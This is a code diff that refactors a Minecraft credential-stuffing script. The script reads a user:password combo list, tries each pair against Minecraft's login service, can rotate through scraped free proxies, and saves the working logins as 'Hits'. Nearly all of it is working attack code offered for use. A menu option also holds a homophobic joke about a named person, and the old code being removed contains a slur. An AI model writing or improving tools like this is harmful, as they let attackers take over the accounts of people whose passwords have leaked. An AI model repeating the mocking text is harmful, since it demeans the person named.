@@ -1,5 +1,7 @@
 import requests
 import time
+import asyncio
+import sys
 from itertools import cycle
 
 import fproxy
@@ -18,12 +20,10 @@ checks = 0
 
 results = open("results.txt", "a")
 
-def auth(user, password):
-    proxies = fproxy.get_proxies()
-    proxypool = cycle(proxies)
 
-    proxy = next(proxypool)
-    payload = ({
+def auth(user, password, use_proxy: bool):
+    payload = (
+        {
             'agent': {
                 'name': 'Minecraft',
                 'version': 1
@@ -33,72 +33,74 @@ def auth(user, password):
             'requestUser': 'true'
         })
     try:
-        r = requests.post(url=auth, json=payload, headers=jsonheaders, proxies={"http": proxy, "https": proxy})
+        if use_proxy:
+            proxies = fproxy.get_proxies()
+            proxypool = cycle(proxies)
+            proxy = next(proxypool)
+            r = requests.post(url=auth, json=payload, headers=jsonheaders, proxies={"http": proxy, "https": proxy})
+        else:
+            r = requests.post(url=auth, json=payload, headers=jsonheaders)
         if r.status_code == 200:
             return 1
         else:
             return 0
-    except:
+    except Exception as e:
         return 2
 
-def authpLess(user, password):
-    payload = ({
-            'agent': {
-                'name': 'Minecraft',
-                'version': 1
-            },
-            'username': user,
-            'password': password,
-            'requestUser': 'true'
-        })
+
+def checkAccount(use_proxy: bool):
+    file = input('Please enter the name of your file!\n> ')
+    while not file.endswith('.txt'):
+        print("Error: File must be a txt file. Please try again.")
+        file = input('Please enter the name of your file!\n> ')
     try:
-        r = requests.post(url=auth, json=payload, headers=jsonheaders)
-        if r.status_code == 200:
-            return 1
-        else:
-            return 0
-    except:
-        return 2
+        with open(file) as f:
+            lines = f.readlines()
+    except FileNotFoundError:
+        print(f"Couldn't find a file named '{file}'. Please double check your spelling, and try again.")
+        input("Press enter to exit.")
+        sys.exit(0)
 
-def check():
-    print('Please type the name of your combo list!\n')
-    combo = input('> ')
-    with open(combo + ".txt") as f:
-        lines = f.readlines()
-    
+    if len(lines) == 0:
+        print("The file you provided is empty! Is that the right file?")
+        input("Press enter to exit.")
+        sys.exit(0)
+
     for line in lines:
-        a = line.split(':')
-        user = a[0]
-        pasd = a[1]
-        if auth(user, pasd) == 1:
-            print('[' + user + ':' + pasd + '] Hit')
-            results.write(user + ':' + pasd)
+        array = line.split(':')
+        if len(array) != 2:
+            print(f"The following line is either not formatted correctly, or is not a user:pass set. Skipping this line...\n{line}")
+            continue
+        user = array[0]
+        passwrd = array[1]
+        if auth(user, passwrd, use_proxy) == 1:
+            print(f"[{user}:{passwrd}] Hit")
+            results.write(user + ':' + passwrd)
         else:
-            print('[' + user + ':' + pasd + '] Miss')
+            print(f"[{user}:{passwrd}]  Miss")
 
-def checkpLess():
-    print('Please type the name of your combo list!\n')
-    combo = input('> ')
-    with open(combo + ".txt") as f:
-        lines = f.readlines()
-    
-    for line in lines:
-        a = line.split(':')
-        user = a[0]
-        pasd = a[1]
-        if authpLess(user, pasd) == 1:
-            print('[' + user + ':' + pasd + '] Hit')
-            results.write(user + ':' + pasd)
-        else:
-            print('[' + user + ':' + pasd + '] Miss')
 
-print('Menu\n [A] Minecraft w/ Free Proxy Scraper(skips line if proxy doesn\'t work)\n [B] Minecraft w/o Proxies\n [G] is Chrusher chris into men?\n')
-choice = input('> ')
-if choice == 'A':
-    check()
-elif choice == 'B':
-    checkpLess()
-elif choice == 'G':
-    print('Yes crusher chris is into men\n :D\n :D\n :D')
-else:
-    print('not an option retard')
+def printMenu():
+    print(
+        "Menu:\n",
+        " [A] Minecraft w/ Free Proxy Scraper (skips line if proxy doesn't work)\n",
+        " [B] Minecraft w/o Proxies\n",
+        " [G] is Chrusher chris into men?\n"
+    )
+
+
+async def main():
+    printMenu()
+    choice = input('> ')
+    while choice not in ('A', 'B', 'G'):
+        print(f"Error: Inputted value of '{choice}' not an option. Please try again.")
+        printMenu()
+        choice = input('> ')
+    if choice == 'A':
+        checkAccount(True)
+    elif choice == 'B':
+        checkAccount(False)
+    elif choice == 'G':
+        print('Yes crusher chris is into men\n :D\n :D\n :D')
+
+asyncio.get_event_loop().run_until_complete(main())
